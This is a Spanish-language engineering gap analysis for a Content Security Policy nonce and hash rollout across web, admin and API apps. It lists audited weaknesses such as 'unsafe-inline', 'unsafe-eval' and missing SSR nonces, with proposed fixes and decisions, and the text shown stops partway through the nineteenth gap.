# SPEC-042 CSP Nonce Integration - Gap Analysis Report

> **Spec**: SPEC-042-csp-nonce-integration
> **Status de la spec**: Completed (20/20 tasks)
> **Fecha de analisis**: 2026-03-16
> **Auditorias realizadas**: 8

---

## Resumen Ejecutivo

SPEC-042 implemento CSP Phase 1 (Report-Only) para web (hash-based via Astro experimental.csp) y admin (nonce-based via TanStack Start middleware). La implementacion es funcionalmente correcta para Phase 1, pero el analisis exhaustivo (6 auditorias, 20+ agentes especializados) revela **52 gaps** entre lo que la spec declara, lo implementado, y lo que falta para una postura de seguridad real. La mayoria son consecuencia de limitaciones de frameworks (Astro Issue #14798, TanStack Start < 1.132.0) y del enfoque Report-Only que no bloquea nada todavia.

**Auditoria #2 (2026-03-16)**: Analisis profundo por equipo de agentes especializados (spec, web, admin, API, tests). Se encontraron **8 gaps nuevos** (GAP-042-18 a GAP-042-25) principalmente relacionados con desviaciones entre la spec y la implementacion real, coverage de tests insuficiente, y scripts inline no documentados.

**Auditoria #3 (2026-03-16)**: Revision de seguridad por ingeniero senior especializado en CSP. Se encontraron **13 gaps nuevos** (GAP-042-26 a GAP-042-38) enfocados en vectores de bypass CSP, directivas faltantes, allowlists excesivamente permisivas, y conflictos entre politicas dual. Se reclasificaron 3 gaps existentes a severidad CRITICAL basado en analisis de impacto real de seguridad.

**Auditoria #4 (2026-03-17)**: Auditoria exhaustiva multi-agente: spec analysis, code analysis, test coverage analysis, y security expert review independiente. Se encontraron **3 gaps nuevos** (GAP-042-39 a GAP-042-41). Se reclasificaron 4 gaps existentes a severidad mayor basado en analisis de seguridad profundo. Hallazgo CRITICO nuevo: API route factory aplica CSP permisivo con `'unsafe-inline'` y CDN domains a TODAS las rutas, no solo docs. Se verifico exhaustivamente que los 38 gaps previos siguen vigentes.

**Auditoria #5 (2026-03-17)**: Auditoria exhaustiva con 4 agentes especializados en paralelo (web CSP, admin CSP, API/tests/cross-cutting, security expert CSP). Se encontraron **3 gaps nuevos** (GAP-042-42 a GAP-042-44). Se reclasificaron 2 gaps existentes. Hallazgo critico nuevo: `onclick` handler inline en `500.astro` viola CSP directamente. Se confirmo que la pagina 500.astro tiene un boton con `onclick="window.location.reload()"` que seria bloqueado por cualquier CSP que no incluya `'unsafe-inline'` en script-src. Confirmacion exhaustiva de que los 41 gaps previos siguen vigentes. Nuevo analisis de dual-policy web confirma que el diseno es correcto PERO la interaccion entre meta (enforcing) y header (report-only) sigue siendo el riesgo principal.

**Auditoria #6 (2026-03-17)**: Auditoria de CONFIRMACION Y PROFUNDIZACION con 6 agentes especializados en paralelo: (1) analisis exhaustivo de spec + gaps existentes, (2) auditoria CSP web app (cada .astro page, cada componente), (3) auditoria CSP admin app (middleware, nonce, Shadcn UI, TanStack devtools), (4) auditoria CSP API (security middleware, CORS, route factory, webhooks, auth), (5) auditoria de tests e infraestructura de testing, (6) caza profunda de gaps no detectados (React client components, error pages, auth flows, service workers, View Transitions, dynamic imports, Shadcn patterns, third-party URLs). Se encontraron **2 gaps nuevos** (GAP-042-45, GAP-042-46). **Confirmacion positiva**: los 44 gaps previos siguen vigentes. Se verifico exhaustivamente que: View Transitions NO crean scripts inline problematicos, Shadcn UI components son CSP-safe (React event handlers), no hay service workers ni PWA patterns, Google Fonts whitelisting es correcto, no hay third-party script tags fuera del allowlist, sanitize-html y DOMPurify estan correctamente aplicados en TODOS los puntos de inyeccion HTML. Se confirmo que scripts Astro sin `is:inline` se bundlean como ES modules externos (CSP-safe, no requieren hashes).

**Auditoria #7 (2026-03-17)**: Auditoria exhaustiva de CONFIRMACION INDEPENDIENTE con 6 agentes especializados en paralelo: (1) analisis profundo de spec completa + metadata + gaps existentes, (2) auditoria CSP web app (cada .astro page, cada componente, todos los scripts inline, estilos dinamicos, terceros), (3) auditoria CSP admin app (middleware, nonce, TanStack Start limitations, Vite version, Shadcn UI), (4) auditoria API + cross-cutting (security middleware, CORS, route factory, vercel.json, env config), (5) busqueda de nuevos gaps (17 vectores: dynamic script injection, eval/Function, blob/data URIs, postMessage, innerHTML, Web Workers, WebSockets, form actions, meta refresh, SVG scripts, CSS @import, prefetch/preload, Trusted Types, upgrade-insecure-requests, sandbox), (6) verificacion de estado actual de 15 items criticos (versiones TanStack/Vite/Astro, SPECs 045/046/047, 500.astro, middleware patterns, vercel.json). **Resultado**: Se confirmaron los 46 gaps previos como vigentes. Se encontraron **3 gaps nuevos** (GAP-042-47 a GAP-042-49). Hallazgos criticos nuevos: SPEC-045/046/047 NO EXISTEN como archivos de spec (solo referenciados en gap report), `https:` wildcard en `script-src` permite scripts de cualquier dominio HTTPS en browsers CSP1, y no hay validacion de coherencia entre meta tag CSP y HTTP header CSP. Confirmaciones positivas: no hay dynamic script injection (createElement script), no hay eval/Function en source code, no hay postMessage sin validacion, no hay innerHTML/dangerouslySetInnerHTML sin sanitizacion, no hay WebSockets, no hay SVG con scripts, no hay CSS @import externo, no hay meta refresh.

**Consolidacion (2026-03-17)**: Tras analisis de complejidad e impacto de las specs propuestas (SPEC-045, SPEC-046, SPEC-047), se decidio FUSIONAR SPEC-046 y SPEC-047 dentro de SPEC-042 como Phase 1.1, 1.2 y 1.3. Solo SPEC-045 (Vite 7 + TanStack migration) se mantiene como spec separada por su riesgo MEDIUM, scope diferente (framework migration), y necesidad de rollback independiente. Los quick wins de SPEC-046 (~16 lineas) y la eliminacion de unsafe-inline de SPEC-047 (~70 lineas, 4 archivos) son suficientemente simples para ejecutarse directo en SPEC-042.

**Auditoria #8 (2026-03-17)**: Auditoria FRESCA e independiente post-consolidacion con 4 agentes especializados: (1) verificacion task-por-task de T-001 a T-038 contra codigo real, (2) busqueda de gaps no cubiertos en 15 areas (auth flows, React islands, dynamic imports, server islands, Sentry init, View Transitions, prefetch, dev toolbar, env vars exposure), (3) revision de seguridad CSP independiente (directive tables, bypass vectors, third-party domain audit, header injection, non-HTML responses), (4) auditoria profunda de admin app (Shadcn inline styles, TanStack Router components, Better Auth, MercadoPago SDK, build output). Se encontraron **3 gaps nuevos** (GAP-042-50 a GAP-042-52). Hallazgo critico: T-016 (inline keyframe migration) esta marcada como completa pero NO fue implementada.. el inline style sigue en router.tsx:30. Las nuevas tasks T-021 a T-038 no estan formalizadas en el sistema de tracking. Confirmaciones positivas: forgot-password.astro script es ES module (CSP-safe, no necesita is:inline), Better Auth no inyecta scripts inline, MercadoPago carga via ESM (no script tags), Sentry no usa inline scripts en SSR, View Transitions son CSS puro, 40 route components usan factory functions (CSP-safe).

---

## Gaps Encontrados

### GAP-042-01: Nonce generado pero NO inyectado en scripts SSR (Admin)

| Campo | Valor |
|-------|-------|
| **Severidad** | CRITICAL (elevado de HIGH en auditoria #3) |
| **Prioridad** | HIGH |
| **Complejidad** | HIGH (depende de Vite 7 + TanStack upgrade) |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/admin/src/middleware.ts:40-49`, `apps/admin/src/routes/__root.tsx:179` |

**Descripcion**: El middleware genera un nonce criptografico por request (`randomBytes(16).toString('base64url')`) y lo expone en `context.cspNonce`, pero ningun `<script>` tag en el HTML renderizado lleva `nonce="..."`. El `<Scripts />` de TanStack Start (linea 179 de `__root.tsx`) se inyecta SIN nonce. Esto significa que en Phase 2 (enforcement), TODOS los scripts de la app serian bloqueados.

**Por que existe**: TanStack Start 1.131.26 no soporta `ssr.nonce` (requiere >= 1.132.0 + Vite 7). Ademas, `createMiddleware({ type: 'function' })` es middleware de server functions, NO de HTTP request.. el CSP header solo se setea en respuestas de server functions, no en el SSR inicial de la pagina.

**Impacto**: Phase 1 (Report-Only) funciona correctamente reportando violaciones. Phase 2 (enforcement) es IMPOSIBLE sin resolver esto.

**Solucion propuesta**:

1. Migrar a Vite 7 (ya existe SPEC-045)
2. Upgrade TanStack Start a >= 1.166.0 (recomendado por spec)
3. Usar `createStart({ requestMiddleware })` + `ssr.nonce` de la nueva API
4. **Recomendacion**: SPEC formal nueva (SPEC-045 ya cubre esto parcialmente)

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Bloqueado por SPEC-045 (Vite 7 + TanStack >= 1.132.0). No se puede resolver sin migración de framework.

---

### GAP-042-02: Astro emite style hashes que pueden romper Sentry Session Replay

| Campo | Valor |
|-------|-------|
| **Severidad** | HIGH |
| **Prioridad** | HIGH |
| **Complejidad** | LOW (workaround ya implementado, pero fragil) |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/astro.config.mjs:143-147`, Astro Issue #14798 |

**Descripcion**: Astro `experimental.csp` emite automaticamente 16 SHA-256 hashes (incluyendo 5 de styles) en el `<meta>` tag, AUNQUE `styleDirective` no esta configurado. Cuando un browser CSP2+ ve hashes en `style-src`, ignora `'unsafe-inline'`, lo cual ROMPE Sentry Session Replay (rrweb inyecta inline styles dinamicamente).

**Workaround actual**: No se configura `styleDirective` en astro.config (documentado en comentarios lineas 143-147). El HTTP header del middleware SI incluye `'unsafe-inline'` en `style-src`. PERO: si Astro decide emitir style hashes en el meta tag sin que se lo pidamos, el browser aplicara la politica mas restrictiva (ambas deben cumplirse).

**Impacto**: Sentry Session Replay puede dejar de funcionar en produccion sin warning previo. La proteccion es fragil porque depende de un bug/comportamiento no documentado de Astro.

**Solucion propuesta**:

1. **Inmediata**: Verificar empiricamente con SPEC-046 post-deploy si Session Replay funciona
2. **Medio plazo**: Si se confirma el problema, deshabilitar `experimental.csp` y manejar CSP 100% via HTTP header en middleware
3. **Largo plazo**: Esperar fix de Astro Issue #14798 (style hash opt-out)
4. **Recomendacion**: Monitorear en SPEC-046, no requiere spec nueva

**Decision (2026-03-17)**: ❌ DESCARTAR. Falso positivo: workaround ya implementado (no se configura styleDirective). Además, experimental.csp se deshabilita por decisión en GAP-042-03.

---

### GAP-042-03: Politica dual CSP (meta + header) crea superficie de conflicto

| Campo | Valor |
|-------|-------|
| **Severidad** | CRITICAL (elevado de MEDIUM en auditoria #3.. Astro meta tag ENFORCE mientras HTTP header solo REPORTA) |
| **Prioridad** | CRITICAL |
| **Complejidad** | MEDIUM |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:92-100`, `apps/web/astro.config.mjs:137-160` |

**Descripcion**: La web app tiene DOS politicas CSP simultaneas: (1) `<meta>` tag de Astro con script/style hashes, y (2) HTTP header del middleware con `frame-ancestors`, `report-uri`, y directives generales. Por spec CSP, un recurso debe satisfacer AMBAS politicas.

**Hallazgo critico (auditoria #3)**: Astro `experimental.csp` emite un `<meta http-equiv="Content-Security-Policy">` tag (NO Report-Only) para paginas prerendered. Para paginas SSR (Astro >= 5.9.3), Astro emite un header HTTP `Content-Security-Policy` ENFORCING. Resultado: el "Phase 1 Report-Only" es FALSO.. la politica de Astro ALREADY ENFORCES en produccion, mientras el middleware solo reporta. Browsers aplican AMBAS: la mas restrictiva gana. Esto significa que scripts y recursos ya se estan bloqueando en paginas SSR/prerendered.

**Problema concreto**: Si el meta tag tiene hashes en `script-src`, el hash DEBE coincidir con el contenido del script. La politica de Astro BLOQUEA sin reportar (enforcement mode), mientras el middleware REPORTA sin bloquear. Esto crea un escenario donde funcionalidad se rompe silenciosamente.

**Impacto**: CRITICO. La promesa de "Phase 1 Report-Only" es parcialmente falsa. Scripts que no esten hasheados por Astro seran bloqueados en produccion AHORA, no en Phase 2.

**Solucion propuesta**:

1. Documentar claramente la interaccion entre ambas politicas
2. En Phase 2, considerar unificar en una sola politica (solo HTTP header) si hay conflictos
3. **Recomendacion**: Monitorear en SPEC-046, documentar hallazgos

**Decision (2026-03-17)**: ✅ HACER Opción A. Deshabilitar experimental.csp de Astro para tener Phase 1 puramente Report-Only. CSP se maneja 100% via HTTP header en middleware.

---

### GAP-042-04: `'unsafe-eval'` en admin CSP puede ser innecesario

| Campo | Valor |
|-------|-------|
| **Severidad** | **HIGH** (elevado de MEDIUM en auditoria #4.. `unsafe-eval` permite construir codigo arbitrario desde strings) |
| **Prioridad** | HIGH (elevado de LOW en auditoria #4.. verificacion debe ser inmediata, no diferida) |
| **Complejidad** | LOW |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/admin/src/lib/csp-helpers.ts:57-61` |

**Descripcion**: El admin CSP incluye `'unsafe-eval'` en `script-src` como precaucion para el script antifraud de MercadoPago (`security.js` que usa `new Function()`). Sin embargo, este script es OPCIONAL y puede que QZPay ni siquiera lo cargue. El grep del codebase no encontro ninguna invocacion de `eval()` o `new Function()` en codigo propio.

**Impacto**: `'unsafe-eval'` debilita significativamente la proteccion CSP. Permite XSS via evaluacion de strings como codigo.

**Solucion propuesta**:

1. Verificar con network devtools si `security.js` se carga realmente
2. Si NO se carga, remover `'unsafe-eval'` del CSP
3. Si SI se carga, documentar y considerar alternativa (ej: `'wasm-unsafe-eval'` si es solo WebAssembly)
4. **Recomendacion**: Resolver directo en SPEC-046 post-deploy verification

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Requiere verificación empírica del checkout flow de MercadoPago para saber si security.js se carga. No se puede resolver solo con código.

---

### GAP-042-05: `'unsafe-inline'` en `script-src` (Web) anula hash-based integrity

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | MEDIUM |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:111`, `apps/web/src/layouts/BaseLayout.astro:84-91,119-178` |

**Descripcion**: El HTTP header del middleware incluye `'unsafe-inline'` en `script-src` (linea 111) para cubrir los 2 scripts `is:inline` de BaseLayout.astro (FOUC prevention y scroll-reveal). Esto es correcto como fallback, pero `'unsafe-inline'` hace que los hashes generados por Astro sean IRRELEVANTES en browsers CSP2+ (porque `'unsafe-inline'` ya permite todo inline). El resultado: la proteccion hash-based de Astro no agrega seguridad real.

**Nota**: `'strict-dynamic'` IGNORA `'unsafe-inline'` en CSP Level 3 browsers, asi que la cadena de fallback es: CSP3 browsers usan `'strict-dynamic'` (seguro), CSP2 browsers usan hashes (seguro), CSP1 browsers usan `'unsafe-inline'` (inseguro).

**Impacto**: La proteccion efectiva depende de la version CSP del browser. En browsers modernos (CSP3), la proteccion es correcta gracias a `'strict-dynamic'`.

**Solucion propuesta**:

1. Migrar los 2 scripts `is:inline` a scripts con hash o modulos ES para eliminar necesidad de `'unsafe-inline'`
2. Astro no genera hashes para `is:inline` (bypass intencional del bundler)
3. Alternativa: computar manualmente los SHA-256 de estos scripts y agregarlos al header
4. **Recomendacion**: SPEC formal nueva para eliminar `is:inline` y `'unsafe-inline'`

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Resolver cuando se planifique Phase 2. Requiere migrar scripts is:inline a ES modules.

---

### GAP-042-06: Sin tests de integracion/E2E para headers CSP en responses reales

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | HIGH |
| **Complejidad** | MEDIUM |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/test/lib/middleware-helpers.test.ts`, `apps/admin/test/lib/csp-helpers.test.ts` |

**Descripcion**: Los tests existentes son UNITARIOS: verifican que `buildSentryReportUri()` y `buildCspDirectives()` generan strings correctos. Pero NO hay tests que verifiquen:

- Que el header `Content-Security-Policy-Report-Only` realmente aparece en respuestas HTTP
- Que el meta tag de Astro contiene los hashes esperados
- Que el nonce del admin es diferente en cada request
- Que la politica CSP no bloquea recursos validos
- Que Sentry `report-uri` recibe violations correctamente

**Impacto**: Regresiones pueden pasar desapercibidas. Un cambio en Astro o TanStack puede romper CSP sin que los tests lo detecten.

**Solucion propuesta**:

1. Agregar tests de integracion que hagan requests reales y verifiquen headers
2. Para web: test con `astro build + preview` verificando meta tag y headers
3. Para admin: test con server real verificando nonce en header
4. Para ambos: test E2E con Playwright verificando que paginas cargan sin violations
5. **Recomendacion**: Incluir en SPEC-046 post-deploy verification

**Decision (2026-03-17)**: ✅ HACER. Agregar tests de integración para CSP headers en responses reales (web + admin).

---

### GAP-042-07: Sin monitoreo/alerting de CSP violations

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:124-125`, `apps/admin/src/lib/csp-helpers.ts:72-75` |

**Descripcion**: Las violations se envian a Sentry via `report-uri`, pero no hay:

- Dashboard dedicado en Sentry para CSP violations
- Alertas configuradas para violations inesperadas
- Proceso documentado para analizar violations durante el periodo de observacion (14 dias)
- Metricas de baseline (cuantas violations son "normales" en Report-Only)

**Impacto**: Sin monitoreo activo, el periodo de observacion de 14 dias requerido por SPEC-046 no tiene metricas objetivas para decidir la transicion a Phase 2.

**Solucion propuesta**:

1. Configurar Sentry issue grouping para CSP violations
2. Crear dashboard con metricas: violations/dia, directives afectados, origenes
3. Configurar alerta si violations > threshold
4. **Recomendacion**: Resolver directo como parte de SPEC-046

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Depende de deploy a producción y verificación de pipeline report-uri (GAP-042-43). Resolver cuando se haga deploy.

---

### GAP-042-08: `buildSentryReportUri` duplicado entre web y admin

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/src/lib/middleware-helpers.ts:213-239`, `apps/admin/src/lib/csp-helpers.ts:11-36` |

**Descripcion**: La funcion `buildSentryReportUri` esta duplicada intencionalmente (documentado en ambos archivos). La spec reconoce esto y difiere la consolidacion para cuando haya mas utilidades CSP compartidas.

**Impacto**: Bajo. Si se modifica la logica en un lugar, puede olvidarse en el otro.

**Solucion propuesta**:

1. Mover a `packages/utils` o crear `packages/csp-utils` cuando haya 3+ utilidades CSP compartidas
2. Por ahora, dejar el TODO existente
3. **Recomendacion**: Resolver cuando se agreguen mas utilidades CSP (no requiere spec)

**Decision (2026-03-17)**: ✅ HACER. Mover buildSentryReportUri a packages/utils para eliminar duplicación.

---

### GAP-042-09: Default CSP en API env.ts incluye `'unsafe-inline'`

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/api/src/utils/env.ts:200`, `apps/api/src/middlewares/security.ts:50-53` |

**Descripcion**: El default de `API_SECURITY_CONTENT_SECURITY_POLICY` en env.ts (linea 200) es `"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';"`, pero el middleware real de security.ts hardcodea `scriptSrc: ["'self'"]` y `styleSrc: ["'self'"]` SIN `'unsafe-inline'`. El valor del env var NO se usa en el middleware.

**Impacto**: Confusion para desarrolladores que lean env.ts y piensen que la API permite inline scripts.

**Solucion propuesta**:

1. Actualizar el default en env.ts para reflejar la politica real
2. O eliminar la env var si no se usa (el middleware la ignora)
3. **Recomendacion**: Resolver directo (fix trivial, no requiere spec)

**Decision (2026-03-17)**: ✅ HACER. Actualizar default en env.ts para reflejar política real o eliminar env var si no se usa. Fix trivial.

---

### GAP-042-10: Solo `report-uri` (deprecated), falta `report-to`

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | MEDIUM |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:124-125`, `apps/admin/src/lib/csp-helpers.ts:72-75` |

**Descripcion**: Ambas apps usan `report-uri` para enviar CSP violations a Sentry. Sin embargo, `report-uri` esta deprecated en CSP Level 3 a favor de `report-to` + `Reporting-Endpoints` header. Chrome ya prioriza `report-to` sobre `report-uri`.

**La spec reconoce esto**: Seccion 8 (Out of Scope) lista `report-to` como fuera de alcance.

**Impacto**: En el futuro, browsers pueden dejar de soportar `report-uri`. Por ahora, funciona.

**Solucion propuesta**:

1. Agregar `report-to` como complemento (no reemplazo) de `report-uri`
2. Requiere configurar `Reporting-Endpoints` header
3. Sentry soporta ambos mecanismos
4. **Recomendacion**: Incluir en futuro SPEC de CSP Phase 2 enforcement

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Funciona correctamente hoy. Resolver en Phase 2 cuando se modernice el reporting.

---

### GAP-042-11: Vercel headers duplican/conflictuan con middleware headers

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/vercel.json:7-35`, `apps/admin/vercel.json:7-35`, `apps/api/vercel.json:13-30` |

**Descripcion**: Los tres `vercel.json` configuran security headers (X-Frame-Options, HSTS, etc.) que tambien son seteados por los respectivos middlewares. Esto genera redundancia y potencial conflic si los valores difieren.

**Ejemplo**: `vercel.json` setea `X-Frame-Options: DENY`, pero el middleware de API setea `X-Frame-Options: SAMEORIGIN` por default. Vercel aplica headers DESPUES del middleware, asi que el valor de vercel.json gana.

**Impacto**: El comportamiento depende del orden de aplicacion de headers en Vercel, que puede cambiar.

**Solucion propuesta**:

1. Decidir una unica fuente: o vercel.json o middleware
2. Preferir middleware (dinamico, testeable) y remover duplicados de vercel.json
3. Dejar vercel.json solo como fallback para assets estaticos
4. **Recomendacion**: Resolver directo o incluir en SPEC-046

**Decision (2026-03-17)**: ✅ HACER. Unificar headers en middleware como fuente única. Limpiar duplicados de vercel.json, dejando solo fallback para assets estáticos.

---

### GAP-042-12: SPEC-046 sigue en draft.. bloquea transicion a Phase 2

| Campo | Valor |
|-------|-------|
| **Severidad** | HIGH |
| **Prioridad** | HIGH |
| **Complejidad** | MEDIUM |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `.claude/specs/SPEC-046-csp-post-deploy-verification/spec.md` |

**Descripcion**: SPEC-046 (CSP Post-Deploy Verification) define el proceso para transicionar de Report-Only a Enforcement. Esta en status `draft` y NO tiene tasks generados. Sin completar SPEC-046, Phase 2 no puede comenzar.

**Requisitos clave de SPEC-046**:

- Deploy a staging
- 14 dias de observacion con zero violations inesperadas
- Verificacion empirica de Sentry Session Replay
- Verificacion de MercadoPago checkout
- Metricas de baseline

**Impacto**: Sin SPEC-046, el sistema queda indefinidamente en Report-Only (sin proteccion real contra XSS).

**Solucion propuesta**:

1. Priorizar SPEC-046: generar tasks, ejecutar
2. Requiere staging environment funcional (ver SPEC-025)
3. **Recomendacion**: SPEC formal existente (SPEC-046), necesita activarse

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Depende de deploy a producción y SPEC-025 (staging environment). La observación de 14 días no puede empezar sin infraestructura.

---

### GAP-042-13: Admin CSP middleware no cubre SSR inicial

| Campo | Valor |
|-------|-------|
| **Severidad** | CRITICAL (elevado de HIGH en auditoria #3.. pagina SSR inicial sin CSP = zero XSS protection) |
| **Prioridad** | CRITICAL |
| **Complejidad** | HIGH |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/admin/src/middleware.ts:4-16` |

**Descripcion**: El `createMiddleware({ type: 'function' })` de TanStack Start 1.131.26 solo se ejecuta para server functions, NO para el render SSR inicial de la pagina. Esto significa que la PRIMERA carga de la pagina (SSR) NO tiene header CSP. Solo las navegaciones subsecuentes (que disparan server functions) tendran CSP.

**Impacto**: La pagina de login (primera carga) y cualquier deep link NO tienen proteccion CSP ni en Report-Only.

**Solucion propuesta**:

1. **Workaround inmediato**: Agregar CSP headers estaticos en vercel.json para admin (al menos basicos)
2. **Solucion real**: Migrar a `createStart({ requestMiddleware })` (requiere Vite 7 + TanStack >= 1.132.0)
3. **Recomendacion**: Workaround inmediato (resolver directo) + SPEC-045 para solucion completa

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Solución real bloqueada por SPEC-045. Workaround via vercel.json se evalúa en GAP-042-51.

---

### GAP-042-14: `is:inline` scripts no reciben hashes de Astro

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | LOW |
| **Complejidad** | MEDIUM |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/src/layouts/BaseLayout.astro:84-91,119-178` |

**Descripcion**: Los scripts marcados con `is:inline` en Astro BYPASEAN el sistema de modulos y bundling. Astro NO genera hashes SHA-256 para ellos. Dependen de `'unsafe-inline'` en la politica CSP para ejecutarse.

**Scripts afectados**:

1. FOUC prevention (dark mode, ~10 lineas)
2. Scroll reveal observer (~60 lineas)

**Impacto**: Si se elimina `'unsafe-inline'` en Phase 2, estos scripts dejarian de funcionar. Requieren migracion a scripts con hash explicito o modulos ES.

**Solucion propuesta**:

1. Migrar FOUC prevention a un modulo ES con `<script>` normal (Astro genera hash automaticamente)
2. Migrar scroll-reveal a un componente React con `client:visible` o modulo ES
3. Calcular manualmente SHA-256 y agregarlos al CSP si no se puede migrar
4. **Recomendacion**: SPEC formal nueva (necesario antes de Phase 2)

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Resolver junto con GAP-042-05 cuando se planifique Phase 2 (migración de is:inline a ES modules).

---

### GAP-042-15: Sin staging environment para observacion CSP

| Campo | Valor |
|-------|-------|
| **Severidad** | HIGH |
| **Prioridad** | HIGH |
| **Complejidad** | HIGH |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | SPEC-025 (staging environment setup, status: pending) |

**Descripcion**: SPEC-046 requiere 14 dias de observacion en staging antes de Phase 2. Pero SPEC-025 (Staging Environment Setup) esta en status `pending` y no tiene tasks. Sin staging, no hay donde observar CSP violations.

**Impacto**: Bloquea completamente la cadena: SPEC-042 (Phase 1) -> SPEC-046 (observacion) -> Phase 2 (enforcement). Sin staging, CSP queda como Report-Only indefinidamente.

**Solucion propuesta**:

1. Priorizar SPEC-025 (staging environment)
2. Alternativa: usar Vercel Preview deployments como "staging" temporal
3. **Recomendacion**: SPEC existente (SPEC-025), necesita activarse

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Depende de SPEC-025 (staging environment). Blocker de infraestructura.

---

### GAP-042-16: Web builds fallando (pre-existente, no de SPEC-042)

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | MEDIUM |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/web/` (Vercel adapter NFT step, missing `minimatch`) |

**Descripcion**: Los findings de SPEC-042 (T-017) documentan que el web build falla en el step NFT del Vercel adapter por dependencia faltante `minimatch`. Este es un problema PRE-EXISTENTE no causado por SPEC-042, pero BLOQUEA la verificacion real del CSP en produccion.

**Impacto**: No se puede deployar web app para verificar CSP en produccion o staging.

**Solucion propuesta**:

1. Agregar `minimatch` a dependencias o resolver incompatibilidad de Vercel adapter
2. **Recomendacion**: Resolver directo (bug fix, no requiere spec)

**Decision (2026-03-17)**: ✅ HACER. Verificar si el build funciona actualmente y resolver si persiste. Posible falso positivo.

---

### GAP-042-17: Admin build falla por env validation (pre-existente)

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW |
| **Auditoria** | #1 (2026-03-16) |
| **Archivos** | `apps/admin/src/env.ts` (VITE_API_URL validation) |

**Descripcion**: Los findings de SPEC-042 (T-018) documentan que el admin build falla en env validation por `VITE_API_URL`. Este es un problema PRE-EXISTENTE no causado por SPEC-042, pero BLOQUEA deploy y verificacion del CSP.

**Impacto**: No se puede deployar admin app para verificar CSP en produccion o staging.

**Solucion propuesta**:

1. Configurar `VITE_API_URL` en CI/CD o hacer el campo opcional para builds
2. **Recomendacion**: Resolver directo (configuracion, no requiere spec)

**Decision (2026-03-17)**: ✅ HACER. Verificar si el build funciona actualmente y resolver si persiste. Posible falso positivo.

---

### GAP-042-18: router.tsx NO implementa getCspNonce via createIsomorphicFn (Admin)

| Campo | Valor |
|-------|-------|
| **Severidad** | HIGH |
| **Prioridad** | HIGH |
| **Complejidad** | HIGH (depende de Vite 7 + TanStack upgrade) |
| **Auditoria** | #2 (2026-03-16) |
| **Archivos** | `apps/admin/src/router.tsx` |

**Descripcion**: La spec requiere EXPLICITAMENTE que `router.tsx` implemente:

1. `getCspNonce` via `createIsomorphicFn()` (server lee de `getGlobalStartContext()`, client lee de `<meta property="csp-nonce">`)
2. Pasar `ssr.nonce` a `createRouter()`
3. `HeadContent` emitiendo `<meta property="csp-nonce" content="{nonce}">`

**Estado real**: NADA de esto esta implementado. El router.tsx solo importa `./start` como side-effect (linea 7) para registrar el middleware, pero NO hay:

- Ninguna llamada a `createIsomorphicFn()`
- Ninguna referencia a `getGlobalStartContext()`
- Ninguna propiedad `ssr.nonce` en `createRouter()`
- Ningun `getCspNonce` function

**Impacto**: El nonce generado por el middleware queda en el `context` del server function pero NUNCA llega a los script tags del HTML renderizado. Esto es un gap critico para Phase 2. Relacionado con GAP-042-01 pero es un gap INDEPENDIENTE: incluso si se resolviera la limitacion del framework, el codigo del router no esta preparado para recibirlo.

**Solucion propuesta**:

1. Este codigo NO puede implementarse hasta que TanStack Start >= 1.132.0 soporte `ssr.nonce`
2. Cuando se haga SPEC-045 (Vite 7), este gap debe resolverse como parte de la migracion
3. **Recomendacion**: Documentar como prerequisito en SPEC-045

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Bloqueado por SPEC-045 (TanStack Start >= 1.132.0). Prerequisito de SPEC-045.

---

### GAP-042-19: TanStack Start version 1.131.26 < minimo requerido por spec (1.133.12)

| Campo | Valor |
|-------|-------|
| **Severidad** | HIGH |
| **Prioridad** | MEDIUM |
| **Complejidad** | MEDIUM |
| **Auditoria** | #2 (2026-03-16) |
| **Archivos** | `apps/admin/package.json` |

**Descripcion**: La spec establece como requisito DURO que TanStack Start debe ser >= 1.133.12 (version donde PR #5522 para nonce propagation aterrizó), y RECOMIENDA >= 1.166.0 (para workaround de Issue #5407). La version actual es 1.131.26, que es ANTERIOR al fix de nonce.

